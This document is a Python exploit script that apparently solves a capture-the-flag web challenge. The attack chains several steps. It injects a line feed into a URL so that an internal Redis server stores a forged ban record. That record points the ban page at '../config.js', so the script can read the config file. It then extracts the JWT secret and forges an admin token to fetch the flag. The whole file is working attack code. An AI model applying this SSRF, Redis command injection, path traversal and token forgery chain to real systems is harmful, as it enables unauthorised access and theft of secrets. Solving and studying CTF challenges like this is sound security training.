import re
import jwt
import sys
import json
import os
import secrets
import hashlib
import requests

from urllib.parse import quote

logs = []


def misconfigured(error):
    if error:
        print("[!] Error: %s" % error, file=sys.stderr)
    else:
        print("[!] Error: Couldn't get the flag", file=sys.stderr)
    if logs:
        print("[!] Logs: \n%s" % "\n".join(logs), file=sys.stderr)
    exit(1)


# Retrieve flag from the remote service
challenge_url = os.environ.get(
    "URL", "http://schei-checker.challs.teamitaly.eu:15001")
redis_url = 'schei-redis:6379'

# Generate a random IP (doesn't need to be a valid one)
random_ip = secrets.token_hex(12)
random_ip_hash = hashlib.sha256(random_ip.encode()).hexdigest()
logs.append("[*] Random IP: %s" % random_ip)
logs.append("[*] Random IP hash: %s" % random_ip_hash)

# Create a JSON string with the IP registered as banned,
# and the ban page changed to the server config file
json = '"' + json.dumps({
    "ip": random_ip,
    "banPage": "../config.js",
    "attempts": 40
}).replace('"', '\\"') + '"'

# Use the HTTP Authentication trick to connect to Redis instead of the challenge server,
# and use the query string line feed injection to register the JSON payload into redis
redis_attack = "set auth#%s %s\n" % (random_ip_hash, json)
url_attack = (
    "@" + redis_url + "/?" +
    "\n" +
    redis_attack +
    "\n"
)
url = challenge_url+'/pricesAPI/getPrice?url=' + quote(url_attack)
logs.append("[*] Attack URL: %s" % url_attack)
logs.append("[*] Final URL: %s" % url)
logs.append("[*] Redis attack: %s" % redis_attack)

response = requests.get(url).text
logs.append("[*] Response: %s" % response)

# Make a login request to retrieve the ban page (which is now the config file)
config = requests.post(challenge_url+'/adminAPI/login?', json={
    "username": "admin",
    "password": random_ip_hash[:10]
}, headers={'X-Forwarded-For': random_ip}).text
logs.append("[*] Configuration file:\n    %s" %
            config.replace("\r\n", "\n").replace("\n", "\n    "))

# Parse the JWT secret from the configuration file
jwt_secret = re.search(r'jwtSecret[ ]*=[ ]*[\`\"\'](.*)[\`\"\']', config)
if jwt_secret == None:
    misconfigured("Couldn't find the JWT secret")
jwt_secret = jwt_secret.group(1)
if jwt_secret == None:
    misconfigured("Couldn't find the JWT secret")
logs.append("[*] JWT secret: %s" % jwt_secret)

# Craft admin JWT token
admin_token = jwt.encode({'username': 'admin'}, jwt_secret, algorithm='HS256')
logs.append("[*] Admin JWT token: %s" % admin_token)

# Request the flag from the admin panel
flag = requests.get(challenge_url+'/adminAPI/getCTFFlag',
                    headers={'Authorization': 'Bearer ' + admin_token}).json()
logs.append("[*] Flag: %s" % flag)

# Print the flag to stdout
print(flag)

if len(sys.argv) > 1 and sys.argv[1] == '-l':
    print("\n".join(logs), file=sys.stderr)
